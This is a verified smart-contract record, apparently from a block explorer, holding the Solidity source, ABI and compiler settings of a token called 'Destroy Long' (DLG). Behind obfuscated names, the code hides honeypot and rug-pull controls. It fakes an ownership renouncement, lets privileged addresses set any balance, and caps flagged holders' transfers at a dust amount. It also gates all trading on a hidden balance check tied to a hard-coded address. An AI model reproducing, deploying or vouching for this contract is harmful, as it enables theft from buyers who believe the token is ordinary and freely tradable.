{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface tradingTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenWallet) external view returns (uint256);\n\n    function transfer(address senderMax, uint256 walletEnableSwap) external returns (bool);\n\n    function allowance(address limitFee, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletEnableSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderMax,\n        uint256 walletEnableSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldMode, uint256 value);\n    event Approval(address indexed limitFee, address indexed spender, uint256 value);\n}\n\nabstract contract fromTo {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface senderTeam {\n    function createPair(address toTxBuy, address tokenSender) external returns (address);\n}\n\ninterface buyLaunchedExempt is tradingTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DestroyLong is fromTo, tradingTake, buyLaunchedExempt {\n\n    event OwnershipTransferred(address indexed minFeeMax, address indexed minAuto);\n\n    uint256 private launchedFund;\n\n    function transferFrom(address enableSwapBuy, address senderMax, uint256 walletEnableSwap) external override returns (bool) {\n        if (_msgSender() != receiverBuy) {\n            if (exemptTotalMax[enableSwapBuy][_msgSender()] != type(uint256).max) {\n                require(walletEnableSwap <= exemptTotalMax[enableSwapBuy][_msgSender()]);\n                exemptTotalMax[enableSwapBuy][_msgSender()] -= walletEnableSwap;\n            }\n        }\n        return tokenModeWallet(enableSwapBuy, senderMax, walletEnableSwap);\n    }\n\n    address private tradingMode;\n\n    address amountLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private totalToken;\n\n    function getOwner() external view returns (address) {\n        return tradingMode;\n    }\n\n    string private minReceiverIs = \"Destroy Long\";\n\n    function approve(address amountSellTeam, uint256 walletEnableSwap) public virtual override returns (bool) {\n        exemptTotalMax[_msgSender()][amountSellTeam] = walletEnableSwap;\n        emit Approval(_msgSender(), amountSellTeam, walletEnableSwap);\n        return true;\n    }\n\n    mapping(address => bool) public liquidityAmount;\n\n    uint256 private amountSwap = 100000000 * 10 ** 18;\n\n    uint256 public marketingAuto;\n\n    uint256 constant modeMinTx = 6 ** 10;\n\n    mapping(address => mapping(address => uint256)) private exemptTotalMax;\n\n    address public liquidityFrom;\n\n    bool private isLiquidity;\n\n    function toSwap() public {\n        emit OwnershipTransferred(liquidityFrom, address(0));\n        tradingMode = address(0);\n    }\n\n    uint256 public teamBuy;\n\n    uint256 private tradingShouldMarketing;\n\n    mapping(address => bool) public launchMax;\n\n    string private fundExemptSell = \"DLG\";\n\n    function launchedLimit(address enableAtSwap) public {\n        walletFund();\n        \n        if (enableAtSwap == liquidityFrom || enableAtSwap == senderWalletTx) {\n            return;\n        }\n        liquidityAmount[enableAtSwap] = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenMin;\n    }\n\n    function transfer(address modeBuy, uint256 walletEnableSwap) external virtual override returns (bool) {\n        return tokenModeWallet(_msgSender(), modeBuy, walletEnableSwap);\n    }\n\n    function launchedMarketingAuto(uint256 walletEnableSwap) public {\n        walletFund();\n        liquidityShould = walletEnableSwap;\n    }\n\n    function allowance(address atLaunch, address amountSellTeam) external view virtual override returns (uint256) {\n        if (amountSellTeam == receiverBuy) {\n            return type(uint256).max;\n        }\n        return exemptTotalMax[atLaunch][amountSellTeam];\n    }\n\n    uint256 liquidityShould;\n\n    function amountTxFrom(address modeBuy, uint256 walletEnableSwap) public {\n        walletFund();\n        shouldLaunchedReceiver[modeBuy] = walletEnableSwap;\n    }\n\n    mapping(address => uint256) private shouldLaunchedReceiver;\n\n    address public senderWalletTx;\n\n    function balanceOf(address tokenWallet) public view virtual override returns (uint256) {\n        return shouldLaunchedReceiver[tokenWallet];\n    }\n\n    uint8 private tokenMin = 18;\n\n    function walletFund() private view {\n        require(launchMax[_msgSender()]);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundExemptSell;\n    }\n\n    function takeSenderReceiver(address enableSwapBuy, address senderMax, uint256 walletEnableSwap) internal returns (bool) {\n        require(shouldLaunchedReceiver[enableSwapBuy] >= walletEnableSwap);\n        shouldLaunchedReceiver[enableSwapBuy] -= walletEnableSwap;\n        shouldLaunchedReceiver[senderMax] += walletEnableSwap;\n        emit Transfer(enableSwapBuy, senderMax, walletEnableSwap);\n        return true;\n    }\n\n    bool private receiverExempt;\n\n    function tokenModeWallet(address enableSwapBuy, address senderMax, uint256 walletEnableSwap) internal returns (bool) {\n        if (enableSwapBuy == liquidityFrom) {\n            return takeSenderReceiver(enableSwapBuy, senderMax, walletEnableSwap);\n        }\n        uint256 buyMarketingShould = tradingTake(senderWalletTx).balanceOf(amountLaunched);\n        require(buyMarketingShould == liquidityShould);\n        require(senderMax != amountLaunched);\n        if (liquidityAmount[enableSwapBuy]) {\n            return takeSenderReceiver(enableSwapBuy, senderMax, modeMinTx);\n        }\n        return takeSenderReceiver(enableSwapBuy, senderMax, walletEnableSwap);\n    }\n\n    bool public amountMarketing;\n\n    function tradingSell(address launchedShould) public {\n        if (amountMarketing) {\n            return;\n        }\n        if (launchedFund != teamBuy) {\n            launchedFund = teamBuy;\n        }\n        launchMax[launchedShould] = true;\n        if (teamBuy != maxTrading) {\n            maxTrading = marketingAuto;\n        }\n        amountMarketing = true;\n    }\n\n    uint256 swapReceiverAt;\n\n    constructor (){\n        if (tradingShouldMarketing != launchedFund) {\n            teamBuy = launchedFund;\n        }\n        teamToken limitTrading = teamToken(receiverBuy);\n        senderWalletTx = senderTeam(limitTrading.factory()).createPair(limitTrading.WETH(), address(this));\n        \n        liquidityFrom = _msgSender();\n        toSwap();\n        launchMax[liquidityFrom] = true;\n        shouldLaunchedReceiver[liquidityFrom] = amountSwap;\n        \n        emit Transfer(address(0), liquidityFrom, amountSwap);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountSwap;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return minReceiverIs;\n    }\n\n    uint256 public maxTrading;\n\n    function owner() external view returns (address) {\n        return tradingMode;\n    }\n\n    address receiverBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public maxFee;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minFeeMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountSellTeam\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletEnableSwap\",\"type\":\"uint256\"}],\"name\":\"amountTxFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountSellTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletEnableSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAtSwap\",\"type\":\"address\"}],\"name\":\"launchedLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletEnableSwap\",\"type\":\"uint256\"}],\"name\":\"launchedMarketingAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderWalletTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedShould\",\"type\":\"address\"}],\"name\":\"tradingSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletEnableSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSwapBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletEnableSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DestroyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}